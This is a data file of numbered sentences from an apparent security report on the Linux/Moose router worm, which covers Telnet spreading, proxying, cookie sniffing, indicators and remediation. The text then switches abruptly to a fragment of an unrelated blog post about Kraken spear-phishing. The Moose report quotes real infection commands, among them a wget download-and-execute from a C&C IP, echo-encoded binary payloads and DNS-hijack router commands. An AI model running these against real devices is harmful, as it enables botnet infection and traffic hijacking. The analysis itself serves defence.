"Still , this number is probably an overestimate because of the wild nature of the Internet and yet might also be an under estimate since many publicly unreachable and therefore uncounted devices might be infected .", "1495": "All of these indicators taken together , while only educated guesses , leads us to think that this threat is real and should be taken seriously .", "1496": "Linux / Moose requires a Linux - based system because of its dependency on Clibc , a popular C library for embedded systems .", "1497": "Plenty of embedded systems are now running Linux - from consumer routers to carrier - grade network gear through Internet of Things ( IoT ) appliances .", "1498": "Some affected devices are easier to identify than others .", "1499": "This path is usually associated with Hik Vision DVRs which are being targeted by embedded malware .", "1500": "Another means of identification is to look at what routers support the methods used to perform DNS Hijacking .", "1501": "Last but not least is to look at what devices are affected by the threats that Linux / Moose tries to eliminate when it runs .", "1502": "Here is a list of vendors we know are being targeted .", "1503": "Vendors Confirmed as Being Affected Actiontec , Hik Vision , Netgear , Synology , TP - Link , ZyXEL , Zhone IoT but even medical devices Based on recent security research we have enough evidence to state that even medical devices like the Hospira Drug Infusion Pump could be infected with Linux / Moose .", "1504": "Of course , just as is the case with IoT , these devices are currently more collateral damage than deliberate targeting .", "1505": "Due to time constraints and hardware availability , we have been unable to confirm so far that certain vendors are definitely targeted .", "1506": "We would love to be able to crowdsource an accurate targeted vendors list .", "1507": "See the full list of potentially targeted vendors in the appendixes for vendor names and validation instructions .", "1508": "As to why some of these devices would ever be attacked by the malware ? Well , there is the malware 's ability to reach behind firewalls but we must not forget what we have learned in 2012 via the Carna Botnet .", "1509": "A lot of devices and services we have seen during our research should never be connected to the public Internet at all .", "1510": "As a rule of thumb , if you believe that \" nobody would connect that to the Internet , really nobody \" , there are at least 1000 people who did .", "1511": "Whenever you think \" that should n't be on the Internet but will probably be found a few times \" it 's there a few hundred thousand times .", "1512": "Like half a million printers , or a Million Webcams , or devices that have root as a root password .", "1513": "- Internet Census 2012 ( Carna botnet ) During our analysis we often asked ourselves , \" Why so much effort in order to interact with social networks ? \" Then we realized that there is a market for follows , likes , views and whatnot .", "1514": "It is pretty clear that this is what is going on here .", "1515": "First , as previously mentioned , there are attempts at stealing cookies from these sites .", "1516": "However , the cookies can not be stolen if the traffic is HTTPS and now most of these sites are HTTPS - only , so it 's unclear how effective these attacks are in this respect .", "1517": "Second , attempting to commit fraud upon these sites needs a reputable and disposable IP address .", "1518": "If someone tries to register 2000 twitter accounts from his own IP address this will likely draw attention .", "1519": "To a social network site operator , there is probably nothing more reputable than an IP address behind a well - known ISP .", "1520": "Just the type of network where you can expect to find badly configured consumer routers .", "1521": "The non - operator - related HTTP traffic we were able to observe was of the well - known Instagram social network .", "1522": "During our monitoring we were able to see more than 700 different Instagram accounts accessed from a single infected router over about a month .", "1523": "Accounts freshly created that we 've seen in the tunnels .", "1524": "When we checked the next day , the account had started to follow around 30 - 40 people .", "1525": "This is no isolated case .", "1526": "Both these accounts were seen in the HTTP traffic and then a few hours later when we checked them they were already following a similar number of accounts .", "1527": "It feels as if the operators understand there to be some threshold value that must not be reached too quickly .", "1528": "Looking more closely at one account , here is a Wireshark screenshot of the HTTP traffic .", "1529": "You can see the username in the highlighted Location header 4 .", "1530": "After a few hours we have a user with 36 followers .", "1531": "Who is he following ? We picked an account at random .", "1532": "Carefully avoiding accounts with pictures that would require some blurring we 've hit an account with surprisingly many followers considering that it has seven posts and follows only seven accounts .", "1533": "After one week it got better .", "1534": "We have also found accounts that are following many similar accounts .", "1535": "Like this one selling Facebook likes .", "1536": "By looking at the tunnel activity we were able to witness many instances of fraudulent social network activity .", "1537": "It seems that people are willing to pay for this , so it is understandable that criminals will try to leverage it .", "1538": "Looking purely at the capabilities of Moose , several attack scenarios can be extrapolated .", "1539": "However due to the complexity of monitoring this threat most of them could n't be confirmed .", "1540": "We will quickly explore the more interesting ones here .", "1541": "Distributed Denial of Service ( DDoS ) attacks Like most botnets , DDoS capability is a possibility .", "1542": "In this case there is nothing built into the malware itself that is related to DDoS but the generic SOCKS proxy implementation allows it .", "1543": "However it does n't seem realistic to waste bandwidth through proxies instead of performing direct attacks .", "1544": "Network exploration Targeted network exploration and eavesdropping is definitely possible with Moose due to its NAT traversal capabilities and its integrated network sniffer , which is configured by a C&C server .", "1545": "The operator could tweak and monitor more closely one infection based on the IP address of the infection if it were affiliated with a government or a bank , for instance .", "1546": "Reconnaissance then DNS Hijacking One technical limitation of Moose is that it can only perform its DNS hijacking payload on victims ' routers during infection .", "1547": "However this is not enabled in the default C&C configuration5 and so we wondered how it could be used .", "1548": "Here is a credible attack that the operator could launch to leverage several pieces of Moose 's functionality and that would enable a reinfection of victims in which their DNS would get hijacked .", "1549": "Note This plan requires knowledge about the malware that hasn't been covered yet .", "1550": "Some of the missing pieces will be explained further along .", "1551": "Linux / Moose is a statically linked ELF binary without debugging symbols .", "1552": "It uses Clibc as its C library .", "1553": "It relies heavily on multithreading with more than 30 running simultaneously during a usual infection .", "1554": "$ file elan2 elan2 : ELF 32-bit MSB executable , MIPS , MIPS32 version 1 ( SYSV ) , statically linked , stripped We based our analysis on the MIPS variants of the threat .", "1555": "The screen captures in this report are taken from this architecture .", "1556": "We quickly analyzed the ARM variant to make sure that this is the same threat and track changes through time , but that 's all .", "1557": "Here is a diagram of the various components of the threat that we will develop in the following sections .", "1558": "Strings obfuscated with this simple algorithm can be made readable with the following Python snippet .", "1559": "We classified Moose as a worm since it attempts to replicate automatically .", "1560": "In this section we will describe how its spreading mechanism works .", "1561": "Note Several parameters provided by the server configuration packet are of interest to understand the spreading behavior .", "1562": "The parameter names have been made up based on the behaviors they modified .", "1563": "The full list and details of these parameters is available in the configuration C&C network protocol section .", "1564": "These threads share the same code , which we will refer to as a scanner thread .", "1565": "The scanner thread 's behavior is altered by being passed a different configuration .", "1566": "Scanner threads and configuration Interestingly the number of threads per set is defined by the configuration C&C server .", "1567": "cnccfg_nb_thdscan_local defines how many threads should scan for IPs closely related to the external IP .", "1568": "cnccfg_nb_thdscan_ext de- fines how many threads should scan using random IPs .", "1569": "Lastly , if cnccfg_flag _ scanner_sniffer is set , then a scanner thread will be launched per addition- al network interface on the system - something we cover later .", "1570": "During the observation period , typical configuration values seen coming from the configuration C&C server were .", "1571": "Scanner threads The three sets of threads are each bootstrapped a bit differently .", "1572": "One set is scanning purely random IP addresses , another one is scanning for random IP addresses that are in the same /15 subnet ( CIDR ) as the external IP address of the infected device , and the last one is incrementally scanning all the IPs on the network interfaces it found up to the interface 's broadcast address .", "1573": "The scanner performs the following operations on each IP .", "1574": "Dissecting Linux / Moose A Moose Encounter - An Infected Host ( Peer ) was Found Unlike the other configuration C&C server interactions , which happen using a custom binary protocol on port 81 , this exchange is done in HTTP on that same port .", "1575": "Here is an example that was captured .", "1576": "Server headers The server headers here are interesting .", "1577": "This Apache server version hasn't been released ( and probably wo n't be for another century ) .", "1578": "Furthermore , to the best of our knowledge , Redhat has never been capitalized \" RedHat \" in Apache Server headers .", "1579": "These leads us to think that what we have here is a custom server that is intended to behave like an HTTP server when sent anything that looks like GET /xx/6 .", "1580": "There are three fields of interest here .", "1581": "They are the fields set in the format string used by the malware .", "1582": "GET /xx / rnde.php?p=%d&f=%d&m=%d HTTP/1.1\\r\\n Host : www.getcool.com\\r\\n Connection : Keep - Alive\\r\\n \\r\\n Note The www.getcool.com hostname is unrelated and an attempt to mislead analysis .", "1583": "The three decimal format placeholders ( % d ) depicted above are .", "1584": "The IP address is lightly obfuscated by being XORed with a fixed key and can be decrypted using the following Python snippet ( where p is the p parameter of the GET ) .", "1585": "Back to the scanner thread description : if there is no connection possible to TCP port 10073 ( no proper handshake ) it tries to connect to the Telnet service of that IP ( TCP port 23 ) .", "1586": "Otherwise it will move on to the next IP address .", "1587": "The Moose is In - Telnet Access The packet to report a successful connection has the following format .", "1588": "Byte ordering Unless otherwise noted , all the network protocol 's Integers are stored in little - endian byte ordering , except for IP addresses , which are stored their native network order ( big - endian ) .", "1589": "The reply from the server is the same packet with the version field repurposed .", "1590": "Infection mechanism After a successful Telnet login , the infection process will start .", "1591": "It can be roughly summarized with the diagram and the steps below .", "1592": "The commands are usually a \" download and execute \" procedure .", "1593": "Depending on the victim 's output the steps will be repeated until a \" Status OK \" string is received from the victim - meaning the malware was installed and started - or the report C&C server stops sending commands .", "1594": "If you are interested in the details , read - on , otherwise feel free to skip to the next section .", "1595": "Here is captured interaction of the successful first stage of the infection process performed by the scanning worm .", "1596": "Note that this is all automated and not performed interactively by the operator .", "1597": "> sh BusyBox v1.00 ( 2013.12.12 - 03:56 + 0000 ) Built - in shell ( msh ) Enter ' help ' for a list of built - in commands .", "1598": "# ps PID Uid VmSize Stat Command 1 admin 468 S init [ ... ] # echo -n -e \" H3lL0WoRlD \" H3lL0WoRlD # chmod BusyBox v1.00 ( 2013.12.12 - 03:56 + 0000 ) multi - call binary Usage : chmod [ -R ] MODE[,MODE ] ...", "1599": "FILE ...", "1600": "Each MODE is one or more of the letters ugoa , one of the symbols + -= and one or more of the letters rwxst .", "1601": "Options : -R Changes files and directories recursively .", "1602": "# cat /proc / cpuinfo [ ... ] system type : MIPS Malta processor : 0 cpu model : MIPS 24Kc V0.0 FPU V0.0 [ ... ] A couple of things are done here .", "1603": "Second stage We now enter the second stage of infection .", "1604": "Each command is decrypted and executed on the victim via Telnet .", "1605": "Typically , this consists of a download and execute but the architecture is flexible and would allow any arbitrary commands to be executed .", "1606": "We 've witnessed two main class of commands sent to perform the infection .", "1607": "The first one is a classic download and execute using wget .", "1608": "# cd /var # rm ./elan2 rm : can not remove ' ./elan2 ' : No such file or directory # wget http://77.247.177.36:81/xx/atheros_mips/elan2 Connecting to 77.247.177.36[77.247.177.36]:81 200 OK , File Get Success # chmod + x ./elan2 # ./elan2 Sys init : OK Status : OK The second technique is encoding the binary into several echo commands that are executed on the victim and redirecting output into a file that is later executed .", "1609": "# cp /bin / ls /dev / elan2 # echo -n -e \" \\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x61\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\ > \\x02\\x00\\x28\\x00\\x01\\x00\\x00\\x00\\x90\\x81\\x00\\x00\\x34\\x00\\x00\\x00\\xb4\\xe9\\x01\\ > \\x00\\x02\\x00\\x00\\x00\\x34\\x00\\x20\\x00\\x03\\x00\\x28\\x00\\x0d\\x00 \" > /dev / elan2 # echo -n -e \" \\x9d\\xe8\\xbc\\x1d\\x03\\x00\\x44\\x90\\x02\\x00\\x94\\xd8\\x02\\x00\\xa4\\x1d\\ > \\x03\\x00\\x0d\\xc0\\xa0\\xe1\\x00\\xd8\\x2d\\xe9\\x04\\xb0\\x4c\\xe2\\xa4\\xd0\\x4d\\xe2\\xa8\\ > \\x00\\x0b\\xe5\\x01\\x30\\xa0\\xe1\\xac\\x30\\x4b\\xe5\\x01\\x30\\xa0\\xe3 \" > > /dev / elan2 ...", "1610": "This two - stage mechanism allows for the report C&C server to specify a URL to an ELF binary that will match the architecture and environment found by the various checks it performed .", "1611": "Plus , it enables the operators to add support for new target platforms without having to upgrade their botnet - but only their distribution methods on the report C&C server .", "1612": "Moose 's Excentricity - Optional Behaviors We just described the most common scanning behavior , but its configuration can alter how it is performed .", "1613": "Here a summary of some of those configuration flags and their effects .", "1614": "Moose Grand Theft Auto - DNS Hijacking Lastly three parameters require more explanation cnccfg_flag_hijackdns , cnccfg_hijackdns1_ip and cnccfg_hijackdns2_ip .", "1615": "If the first parameter is enabled , it will run the following commands on the Telnet console before trying to obtain a shell .", "1616": "The % s % s is replaced with the two DNS IP addresses provided in the configuration .", "1617": "What is DNS Hijacking ? DNS Hijacking consists of changing the DNS servers used by a victim in order to perform other attacks like phishing or man - in - the - middle .", "1618": "DNS servers do the domain name to IP address translation .", "1619": "A malicious DNS server can change ( or hijack ) that translation so that any legitimate domain name will resolve to an IP address of the attackers ' choice .", "1620": "set lan dhcp server set lan dhcpdns % s % s dns config static % s % s save The code attempts to replace the legitimate DNS servers used by the target router with malicious servers .", "1621": "However there are a lot of different text - based user interfaces for such devices .", "1622": "This probably explains why it is attempting to do so using more than one method .", "1623": "Quick googling reveals that at least some of TP - Link , Zyxel , Zhone and Netgear models support one of these commands .", "1624": "The code is not concerned with error - handling , it will resume execution after the DNS hijacking attempt regardless of any errors encountered .", "1625": "This method of scanning is a straightforward yet effective way of finding new targets to copromise .", "1626": "Going for IP addresses nearby is clever and probably yields to higher infection rate because it might be scanning past firewalls as we will cover in the next section .", "1627": "One of the most interesting aspects of this threat is its ability to go deep inside networks , trying hard to spread past firewalls .", "1628": "Two different mechanisms will be at play here : first , a spreading mechanism that understands the realities of large network firewall configurations and second , support for custom NAT traversal .", "1629": "This section will describe both behaviors .", "1630": "This IP address is then used as a basis for near - home scanning on the Telnet port .", "1631": "The IP addresses reached this way are random , but all inside the same /15 network of the infected router 's public IP .", "1632": "The above diagram illustrates why the operators focus more on the near home scanning .", "1633": "Black lines represent network connectivity and yellow arrows represent network interactions .", "1634": "Here we highlighted .", "1635": "During our monitoring of an infected device we saw that Telnet access was 3 times more successful when scanning for near - home IP addresses than when scanning random IP addresses on the Internet .", "1636": "We think this difference is explained by NAT and misconfigured firewalls .", "1637": "This does n't surprise us given the complexity of modern networks and the amount of firewall rules they need .", "1638": "Furthermore , a study of firewall rules by Avishai Wool demonstrated a correlation between the complexity and volume of firewall rules and the number of errors made in their configuration - badly locked- down Telnet access being one of the errors mentioned in the study .", "1639": "Additionally , the worm will launch an extra scanner thread per IP interface present on the system , carefully avoiding /32 IPs ( IP aliases ) and loopback interfaces ( like 127.0.0.1 ) .", "1640": "On successful infection , the newly - compromised machine will spawn scanners on its own internal IP interfaces and thus go deeper inside the private network .", "1641": "This type of automated network pivoting is very interesting for a couple of reasons .", "1642": "Another interesting capability related to network penetration is the custom NAT traversal implementation .", "1643": "It could be categorized as a simple implementation of the concepts behind the Session Traversal Utilities for NAT ( STUN ) and Traversal Using Relays around NAT ( TURN ) standards .", "1644": "The configuration given by the configuration C&C server to the infected host provides both its public IP address and the address of a system that is going to be used as a relay ( relay C&C server ) .", "1645": "During our analysis of the threat the relay C&C IP address was always the same : 93.190.140.221 .", "1646": "The configuration values affecting the behavior of the NAT traversal are the following .", "1647": "We will explain where these values come from when we will describe the configuration C&C network protocol further along .", "1648": "If NAT traversal is enabled , two threads are created at start - up that are dedicated to reach the relay C&C server .", "1649": "The relay is queried at short intervals ( defined by cnccfg_relaycnc_sleep ) for anything to proxy through the infected host .", "1650": "The server replies either with one IP address and port ( for outreach ) or multiple pairs of IP addresses and ports ( for relay ) .", "1651": "First the infected device reaches out to the relay with this hardcoded packet .", "1652": "18 00 00 00 The server responds with the following structure .", "1653": "For example .", "1654": "00 00 00 50 c0 a8 01 01 \\-1-/ \\-2-/ \\----3 - ---/ The infected host will then connect on the tunnel destination it has received .", "1655": "Upon successful connection , it will hand over the two sockets to a thread dedicated to move the data back and forth between the tunnel destination and the relay C&C server .", "1656": "This way , even if a host is unreachable from the Internet because of firewalls or NAT , the operators can still use the infected host .", "1657": "During our monitoring of the threat , we saw tunnels being made to reach social networks .", "1658": "However , most of the time , the server was seen to respond with a TCP reset ( RST ) and sometimes sleep commands .", "1659": "However when we look at the code , we find that a limited number of IP addresses are allowed through .", "1660": "The is_in_whitelist function makes sure that the source IP address of the connection is in a list of IP address given by the configuration C&C server earlier .", "1661": "If it is , then the socket and some configuration is passed to a thread that will handle the connection .", "1662": "Note The whitelist These are the only IP addresses allowed to interact with the malware .", "1663": "According to our monitoring , the addresses in the list haven't changed in months but it will likely be modified after the operators become aware of this report .", "1664": "These servers could be either operator - owned or compromised .", "1665": "The current whitelist of IP addresses is available in the appendix sections under Indicators of Compromise ( IOC ) .", "1666": "The presence of a whitelist and the fallback behavior of closing the socket after a successful TCP handshake implies that we ca n't enumerate infected hosts by scanning the whole Internet on port 10073 .", "1667": "Proxy Server Worker The proxy server worker thread processes the connection from a whitelisted IP address .", "1668": "Upon connection the server will read a single byte .", "1669": "Depending on that command byte , one of four things can happen .", "1670": "These are all classic protocols to use when one wants to have Internet traffic appear as if it was originating from the infected device .", "1671": "The worm uses this approach to leverage the good IP address reputation of big internet service providers ( ISP ) clients with regards to casual browsing like viewing ads , send emails or interact with social networks .", "1672": "Doing any of these activities in bulk from a few data - center IP addresses would draw unwanted attention .", "1673": "The implementation of the SOCKS 4 proxy is according to specifications .", "1674": "It enables the establishment of a TCP tunnel from the infected server to a host specified by the connecting party .", "1675": "Here you can see the SOCKS exchange ( 1 ) with the tunnel destination information .", "1676": "Once the infected host replied that the connection is successful ( 0x5a ) then the client ( botnet operator ) sends its HTTP request ( 2 ) to have it proxied through the infected machine .", "1677": "The infected host will finally return the response it received from the tunnel destination ( 3 ) .", "1678": "In this case , it is a request to upgrade to HTTPS via a Location header .", "1679": "This has been by far the most active protocol while we have been monitoring .", "1680": "Very similar to SOCKS 4 , SOCKS 5 is a protocol to allow TCP tunnels to be created between the server 's client and an arbitrary host .", "1681": "The malware 's implementation is incomplete and only supports the \" No authentication \" authentication method .", "1682": "This partial support is likely to be enough for the operators since they already have the whitelist mechanism in place to prevent unwanted hosts from accessing the malware .", "1683": "We believe it was implemented in order to support a maximum number of client applications .", "1684": "HTTP Proxy The HTTP proxy is a basic yet complete HTTP/1.1 proxy .", "1685": "It looks at the HTTP headers , resolves the destination host , connects to it and sends the data back to the client .", "1686": "It will also honor the CONNECT method if it is present enabling HTTPS to be proxied through .", "1687": "Whichever proxy technique is used , anything that tries to deal with destination TCP ports 25 ( SMTP ) , 465 ( STMPS ) or 587 ( Submission ) will require a special flag to be set in the whitelist configuration sent by the configuration C&C server .", "1688": "Most of the whitelisted server have this flag turned off .", "1689": "The mechanisms described above allow the botnet operator to leverage the good IP reputation of the infected devices in a very lightweight , flexible and inconspicuous manner .", "1690": "This is a particularly interesting capability considering that routers are often forward all sorts of traffic .", "1691": "This section will describe this behavior .", "1692": "Enabling , this functionality requires two different configuration flags to be set : cnccfg_flag _ scanner_sniffer and cnccfg_flag_thd_sniffer .", "1693": "When set , these will spawn a sniffer thread on all non - loopback interfaces that have received at least 101 packets .", "1694": "This check is done in order to avoid creating threads for interfaces that will not carry potentially interesting traffic .", "1695": "The thread dedicated to eavesdropping is rather simple .", "1696": "In order to avoid doing too much work , only TCP packets are inspected .", "1697": "They are searched for strings that were sent by the configuration C&C server as snfcfg_<id>_needle in the network protocol analysis detailed later .", "1698": "Currently the network sniffers are configured to search for the following strings .", "1699": "As previously mentioned , these are the HTTP cookies used by popular social network sites .", "1700": "The exact format is described below .", "1701": "The reply packet is .", "1702": "This mechanism is very interesting .", "1703": "It is lightweight enough to run on small embedded devices and yet it gives a lot of contextual information to the operators to do all sort of mischief by stealing important data .", "1704": "Every hour , it goes through every process entry under /proc/<pid>/ and searches thoroughly through the cmdline file .", "1705": "cmdline holds the process original name , and any arguments given to it at startup , separated by null bytes ( 0x00 ) .", "1706": "This blacklist , as opposed to many of the other characteristics of this malware , is hardcoded in the binary .", "1707": "This function requires a configuration flag to be set : cnccfg_flag_killprocess .", "1708": "During our monitoring of the threat 's traffic this flag was always on .", "1709": "Here is the blacklist .", "1710": "All these entries are related to digital currency mining operations - something performed by other embedded threats .", "1711": "Killing these processes is probably done to make sure that all of the limited resources of the system are available to Linux / Moose .", "1712": "The cmd.so string seems specific to the Synology Disk Miner .", "1713": "/.usb2 , /.scan and ./ipt all lead to the same ARM Linux miner worm .", "1714": "Most of these other worms also leverage weak or default credentials , so it makes sense that they try to get rid of each other .", "1715": "We are giving a very detailed description of the network protocol to enable affected organizations to apply this knowledge to their defense mechanism .", "1716": "The operators of Linux / Moose can recompile and modify binaries to avoid detection but modifying their network protocol takes more time , which is why we share this information in the hopes of negatively affecting their operation .", "1717": "Below is the protocol described in text aimed at describing the components ' interactions .", "1718": "To deobfuscate quickly the traffic that was captured , we refer you to our malware - research repository on Github where we added tshark commands and Python code to see the traffic described below .", "1719": "There are two typical exchanges with the configuration C&C server .", "1720": "One is done every hour and one is done every four hours .", "1721": "The only difference is that the username and password list used for bruteforce attacks is omitted in the hourly run .", "1722": "Here is what a configuration exchange with the configuration C&C server looks like .", "1723": "The structure of the data sent to the configuration C&C server is the following .", "1724": "It is composed of independent blocks of configuration information with some being optional .", "1725": "The high - level protocol takes the following form .", "1726": "module .", "1727": "Where these flags can be enabled or not in the additional configuration field .", "1728": "Each item of the whitelist is sent in the following format .", "1729": "The number of entries is the previously described whitelist size .", "1730": "Each item of the sniffer configuration is sent in the following format .", "1731": "The number of entries is the previously described sniffer configuration size .", "1732": "Here is the example configuration shown in the screenshot after being parsed by our Python tool ( username and password list skipped for brevity ) .", "1733": "Dissecting Linux / Moose An example request to the configuration C&C server $ ./parse_cnc_request.py cfgcnc.raw { ' cnc_request_flags . BRUTEFORCE_LIST ' : True , ' cnc_request_flags . WRITE_ACCESS ' : True , ' loop_count ' : 453 , ' msg_type ' : 1 , ' msg_type_decoded ' : ' REQUEST_CONFIG ' , ' nb_extscans ' : 294 , ' nb_ifscans ' : 9 , ' nb_killed ' : 0 , ' nb_localscans ' : 571 , ' version ' : 28 } An example response from the configuration C&C server $ ./parse_cnc_config.py 4h cfgcnc-response.raw { ' cnccfg_ext_ip ' : ' < redacted > ' , ' cnccfg_flag_hijackdns ' : False , ' cnccfg_flag_killprocess ' : True , ' cnccfg_flag_nattraversal ' : True , ' cnccfg_flag_noextscan ' : False , ' cnccfg_flag_nolocalscan ' : False , ' cnccfg_flag_recontactcnc ' : True , ' cnccfg_flag_scanner_sniffer ' : True , ' cnccfg_flag_share_peers ' : False , ' cnccfg_flag_test10073 ' : True , ' cnccfg_flag_thd_sniffer ' : True , ' cnccfg_hijackdns1_ip ' : 0 , ' cnccfg_hijackdns2_ip ' : 0 , ' cnccfg_nb_thdscan_ext ' : 10 , ' cnccfg_nb_thdscan_local ' : 20 , ' cnccfg_proxy_max_clients ' : 5 , ' cnccfg_relaycnc_ip ' : ' 93.190.140.221 ' , ' cnccfg_relaycnc_sleep ' : 10 , ' cnccfg_relaycnc_timeout ' : 600 , ' cnccfg_reportcnc_ip ' : ' 85.159.237.107 ' , ' snfcfg_00_needle ' : ' twll= ' , ' snfcfg_01_needle ' : ' twid= ' , ' snfcfg_02_needle ' : ' LOGIN_INFO= ' , ' snfcfg_03_needle ' : ' c_user= ' , ' snfcfg_04_needle ' : ' ds_user_id= ' , ' snfcfg_05_needle ' : ' SAPISID= ' , ' snfcfg_06_needle ' : ' APISID= ' , ' snfcfg_07_needle ' : ' PLAY_ACTIVE_ACCOUNT= ' , ' snfcfg_nb_items ' : 8 , ' userpass_list_len ' : 4475 , ... , ' whitelist_len ' : 57 , ' whlst_00_can_email ' : False , ' whlst_00_ip ' : ' 77.247.177.31 ' , ' whlst_01_can_email ' : True , ' whlst_01_ip ' : ' 85.159.237.107 ' , ' whlst_02_can_email ' : False , ' whlst_02_ip ' : ' 85.159.237.108 ' , ' whlst_03_can_email ' : True , ' whlst_03_ip ' : ' 192.168.1.3 ' , ... , ' whlst_56_can_email ' : False , ' whlst_56_ip ' : ' 103.238.216.218 ' } Dissecting Linux / Moose Version 20 Version 28 to 29 Version 29 to 31 Linux / Moose is a novelty when you consider that most embedded threats these days are used to perform DDoS attacks .", "1734": "Considering the rudimentary techniques used by Moose in order to gain access to other devices , it is unfortunate that the security of embedded devices is n't taken more seriously by vendors .", "1735": "With the increasing connectivity and proliferation of Linux - based devices , something will need to be done in that area .", "1736": "We hope that this publication will help vendors better understand how the malicious actors are targeting their devices .", "1737": "As knowledgeable IT people , most of us already check if patches are installed or if anti - virus software is updated and operating when we visit friends and relatives .", "1738": "With all the embedded threats out there , we will need to add a quick check of their router to that to - do list .", "1739": "Consider contributing to our potentially targeted vendor list if you find anything .", "1740": "Unfortunately , this type of animal is far from extinct .", "1741": "Here are the SHA1 hashes , architecture and malware version of the files we 've encountered .", "1742": "Network - based Indicators Traffic patterns Traffic from infected device to these IP : ports combinations using TCP Traffic from these IP addresses ( the whitelist ) going to infected device on TCP port 10073 Host - based Indicators This last indicator can be verified using netstat -anp .", "1743": "Depending on system configuration the -p flag might not be available .", "1744": "If it 's not , then you can look for lsof or try manually correlating the content of /proc / net / tcp/ with /proc/<pid>/fd as explained here .", "1745": "Detection ( yara ) In order to identify if a file or a set of files is the Linux / Moose threat you can use the popular yara tool .", "1746": "Using the linux-moose.yar Yara rule available from our github repository you can recursively crawl a directory for Linux / Moose with .", "1747": "yara -r linux-moose.yar directory/ If the command yields no output then no files were identified to be Linux / Moose .", "1748": "Otherwise identified filenames are printed .", "1749": "Further modifications made by the malware author to evade detection will impact the usefulness of this Yara rule over time .", "1750": "Reboot the affected device then change its password as soon as possible .", "1751": "Keep in mind , however , that the compromised system was accessible via credentials that the operators knew , that they were aware of its IP address and they had means to access its interactive console .", "1752": "They might have had manual access , which means that further infection is possible , including permanent firmware modifications ( the link is in German ) .", "1753": "A factory reset , firmware update or reinstall and password change is probably best .", "1754": "Change default passwords on network equipment even if it is not reachable from the Internet .", "1755": "Disable Telnet login and use SSH where possible .", "1756": "Make sure that your router is not accessible from the Internet on ports 22 ( SSH ) , 23 ( Telnet ) , 80 ( HTTP ) and 443 ( HTTPS ) .", "1757": "If you are unsure about how to perform this test , when you are at home , use the \" common ports \" scan from the ShieldsUP service from GRC.com .", "1758": "Make sure that the above mentioned ports receive a Stealth or Closed status .", "1759": "Running the latest firmware available from your embedded device vendor is also recommended .", "1760": "Note To obtain the latest version of this list check our malware - research github page We have cross - referenced the list of usernames and passwords that Moose uses in order to spread with a list of vendors known to have these as default credentials and confirmed that some of their products have Telnet access enabled .", "1761": "Here is the list of potentially targeted vendors we 've come up using this methodology : Network equipment vendors 3Com , Alcatel - Lucent , Allied Telesis , Avaya , Belkin , Brocade , Buffalo , Celerity , Cisco , D - link , Enterasys , Hewlett - Packard , Huawei , Linksys , Mikrotik , Netgear , Meridian , Nortel , SpeedStream , Thomson , TP - Link , Zhone , ZyXEL Appliances vendors APC , Brother , Konica / Minolta , Kyocera , Microplex , Ricoh , Toshiba , Xerox Internet of Things vendors Hik Vision , Leviton Keep in mind that this is a list of potentially targeted vendors .", "1762": "Current Moose versions need some Unix - type shell access in order to infect a machine where it successfully logged in .", "1763": "On some devices this type of access is hidden behind another set of credentials or tech - support secret passwords .", "1764": "Moose does n't target these environments .", "1765": "Since we do n't have access to the hardware for testing we could n't validate this aspect in the above lists .", "1766": "If you have access to any of this hardware please let us know .", "1767": "If the credentials can be used via Telnet to login , if Telnet is enabled by default and if a shell access can be obtained by typing sh in the device 's prompt , then these are very good indicators that a device could be infected by Linux / Moose .", "1768": "The last list below contains vendors that were correlated using the default credentials list as previously mentioned but that we were not able to gather information about if they had Telnet access enabled or not .", "1769": "Ericsson , F5 Networks , Fortinet , Siemens , LSI Corporation , Maxim Integrated , Accelerated Network , Quantum , Advantek , Airtel , AirTies , Radware , Ubee Interactive , AOC , Applied Innovations , Arescom , ARtem , Asante , Ascend , ATL , Atlantis , AVM , Avocent , Axis , Aztech , Bay Networks , Bintec , BMC , Broadlogic , Canyon , Cellit , Ciphertrust , CNet , Compaq , Comtrend , Conceptronic , Conexant , Corecess , CTC Union , Cyclades , Davox , Demarc , Digicom , Draytek , Dynalink , E - Con , Efficient , Everfocus , Flowpoint , Gericom , IBM , iDirect , Inchon , Infacta , Infoblox , INOVA , Interbase , Intermec , Intracom , JD Edwards , Kasda , KTI , Lantronix , Laxo , LG , Livingston , Marconi , McAfee , McData , Mentec , Micronet , Milan , Motorola , Mro software , Netopia , Netport , Netscreen , Netstar , Niksun , Nokia , NOMADIX , Olitec(trendchip ) , OpenConnect , Osicom , Overland , Ovislink , Pansonic , Phoenix , Pirelli , Planet , Ptcl , QLogic , Quintum Technologies , RM , RoamAbout , Sagem , Samsung , Server TechnologyPower , Sharp , Signamax , Siips , Silex Technology , Simple Smdr , Sitecom , Smartswitch , SMC , Sonic - X , Spectra Logic , SpeedXess , Sphairon , SSA , Stratacom , Swissvoice , Symbol , System/32 , Tandem , Telewell , Telindus , Tellabs , Topsec , Troy , TVT System , U.S.", "1770": "Robotics , Unisys , VASCO , VxWorks , Wang , Weidm eller , Westell , X - Micro , xd , Xylan , Xyplex , Zebra , ZTE If you know that a particular vendor make and model that could be affected please contact us and contact them .", "1771": "G Data International G Data Germany RSS Feed back 07.05.2015 , Author : Paul Rascagn res In January 2015 , unidentified attackers attempted to infiltrate a multi - national enterprise based in the United Arab Emirates , using a spear phishing attack with a crafted MS Word document attached to the message .", "1772": "G DATA 's security experts identified the malware behind this attack and reveal information about the actual power of the malware 's tentacles .", "1773": "In this article , the G DATA SecurityLabs will have a look at the following topics : an example of the spear phishing campaign , sent only a few days after the malware has been advertised the marketing approach to sell the malware the analysis of some of Kraken 's features theories about why Kraken has been used as malware in a targeted attack The attacker(s ) sent a specially crafted email to at least one employee of the attacked enterprise .", "1774": "The email 's body reveals a business - related topic : an offer to become member of this year 's International Trade Council .", "1775": "Nevertheless , the offer is directed at the Philippine National Bank , not the enterprise actually receiving the email .", "1776": "This could be a trick to make the recipient even more curious to look at the attached document , because he / she received documents not issued for him / her .", "1777": "The G DATA experts alerted the aeCERT about the incident and their analysis results .", "1778": "Search Recent entries : 10.04.2015 : Staying alert when buying banners : Google 's advertising service misused for distributing malware 31.03.2015 : IoT : The Internet of Things ...", "1779": "ehm ...", "1780": "Trouble ? ! 16.03.2015 : The Andromeda / Gamarue botnet is on the rise again 06.03.2015 : Casper : the newest member of the cartoon malware family 22.02.2015 : The power of trust : \" Superfish \" case turns into a worst case scenario Category Adware Bots & Botnets CyberCrime eCrime economy Legal issues Exploits Funny findings Web threats Scareware Phishing Security products Vulnerabilities Social engineering Mails Mobile Mobile Social Network Tags 1337 crew adware aldi amtso analysis android android market apple apt authentication autorun av products award badusb banking blog bot botnet bredolab browser brwoser bug carbon 